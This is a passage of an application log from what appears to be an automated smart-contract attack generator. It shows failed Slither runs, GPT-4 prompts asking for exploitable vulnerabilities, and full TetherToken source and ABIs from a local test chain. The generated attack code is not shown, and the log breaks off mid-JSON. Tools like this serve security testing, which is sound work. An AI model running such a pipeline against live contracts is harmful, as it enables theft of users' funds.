  File "/app/modules/slither_scan.py", line 152, in slither_analyze
    slither_result = run_slither(sol_path, json_path, solc_version)
                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 69, in run_slither
    ensure_solc_version(solc_version)
  File "/app/modules/slither_scan.py", line 44, in ensure_solc_version
    raise EnvironmentError("solc-select non trouv√© : installe-le via pip install solc-select")
OSError: solc-select non trouv√© : installe-le via pip install solc-select

2025-06-23 14:42:31,661 - app.modules.attack_generator - INFO - Starting complete attack strategy generation
2025-06-23 14:42:31,662 - app.modules.attack_generator - INFO - Contract name: Ownable
2025-06-23 14:42:31,663 - app.modules.attack_generator - INFO - Using step number: 0 for model selection
2025-06-23 14:42:31,664 - app.modules.attack_generator - INFO - üîç Step 1: Analyzing contracts for vulnerabilities...
2025-06-23 14:42:31,678 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-23 14:42:31,680 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-23 14:42:31,681 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-23 14:42:31,854 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-23 14:42:32,930 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-23 14:42:33,864 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-23 14:42:34,027 - app.services.contract_service - INFO - Contract TetherToken setup completed
2025-06-23 14:42:34,029 - app.services.contract_service - INFO - Funding contract TetherToken for attack testing...
2025-06-23 14:42:34,200 - app.services.contract_service - INFO - Contract TetherToken funded
2025-06-23 14:42:34,203 - app.services.contract_service - INFO - Building contract observation...
2025-06-23 14:42:37,235 - app.services.contract_service - INFO - Contract observation built successfully
2025-06-23 14:42:37,245 - app.services.contract_service - INFO - Generating attack strategy...
2025-06-23 14:42:37,247 - app.services.contract_service - INFO - Running Slither analysis...
2025-06-23 14:42:37,265 - app.services.contract_service - WARNING - Failed to run Slither analysis: solc-select non trouv√© : installe-le via pip install solc-select
2025-06-23 14:42:37,278 - app.services.contract_service - WARNING - Traceback (most recent call last):
  File "/app/modules/slither_scan.py", line 38, in ensure_solc_version
    subprocess.run(
  File "/usr/local/lib/python3.12/subprocess.py", line 548, in run
    with Popen(*popenargs, **kwargs) as process:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/subprocess.py", line 1026, in __init__
    self._execute_child(args, executable, preexec_fn, close_fds,
  File "/usr/local/lib/python3.12/subprocess.py", line 1955, in _execute_child
    raise child_exception_type(errno_num, err_msg, err_filename)
FileNotFoundError: [Errno 2] No such file or directory: 'solc-select'

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/app/services/contract_service.py", line 192, in analyze_contract_from_code
    slith_result = slither_analyze(temp_path)
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 152, in slither_analyze
    slither_result = run_slither(sol_path, json_path, solc_version)
                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 69, in run_slither
    ensure_solc_version(solc_version)
  File "/app/modules/slither_scan.py", line 44, in ensure_solc_version
    raise EnvironmentError("solc-select non trouv√© : installe-le via pip install solc-select")
OSError: solc-select non trouv√© : installe-le via pip install solc-select

2025-06-23 14:42:37,280 - app.modules.attack_generator - INFO - Starting complete attack strategy generation
2025-06-23 14:42:37,281 - app.modules.attack_generator - INFO - Contract name: Ownable
2025-06-23 14:42:37,282 - app.modules.attack_generator - INFO - Using step number: 0 for model selection
2025-06-23 14:42:37,285 - app.modules.attack_generator - INFO - üîç Step 1: Analyzing contracts for vulnerabilities...
2025-06-23 14:42:37,299 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-23 14:42:37,301 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-23 14:42:37,302 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-23 14:42:53,407 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-23 14:42:53,435 - app.modules.attack_generator - INFO - Received response from OpenAI API in 21.75 seconds
2025-06-23 14:42:53,450 - app.modules.attack_generator - INFO - Contract analysis completed in 21.75 seconds
2025-06-23 14:42:53,452 - app.modules.attack_generator - INFO - Vulnerability assessment: **A. Centralization / Owner Power Risks**  
- The owner has **extensive control**: can pause/unpause...
2025-06-23 14:42:53,455 - app.modules.attack_generator - INFO - ‚öîÔ∏è Step 2: Generating attack code...
2025-06-23 14:42:53,457 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-23 14:42:53,459 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-23 14:42:53,460 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-23 14:42:58,475 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-23 14:42:58,499 - app.modules.attack_generator - INFO - Received response from OpenAI API in 5.04 seconds
2025-06-23 14:42:58,506 - app.modules.attack_generator - INFO - Attack code generation completed in 5.04 seconds
2025-06-23 14:42:58,508 - app.modules.attack_generator - INFO - Generated attack code of type solidity with length 932
2025-06-23 14:42:58,511 - app.modules.attack_generator - INFO - Total attack strategy generation completed in 26.79 seconds
2025-06-23 14:42:58,513 - app.modules.attack_generator - INFO - Attack strategy generation completed successfully
2025-06-23 14:42:58,526 - app.services.contract_service - INFO - Attack strategy generated successfully: {'analysis': {'analysis_prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmppqva0qgb.sol",\n  "contracts": [\n    {\n      "contract_name": "Ownable",\n      "address": "0xC89Ce4735882C9F0f0FE26686c53074E09B0D550",\n      "abi": [\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        }\n      ],\n      "functions": [\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0xC89Ce4735882C9F0f0FE26686c53074E09B0D550": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99748409580000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "Pausable",\n      "address": "0xD833215cBcc3f914bD1C9ece3EE7BF8B14f841bb",\n      "abi": [\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "unpause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "paused",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "pause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Pause",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Unpause",\n          "type": "event"\n        }\n      ],\n      "functions": [\n        {\n          "name": "unpause",\n          "signature": "unpause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "paused",\n          "signature": "paused()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "pause",\n          "signature": "pause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [\n        {\n          "name": "Pause",\n          "inputs": []\n        },\n        {\n          "name": "Unpause",\n          "inputs": []\n        }\n      ],\n      "accounts_balances": {\n        "0xD833215cBcc3f914bD1C9ece3EE7BF8B14f841bb": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99748409580000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "paused": false,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * 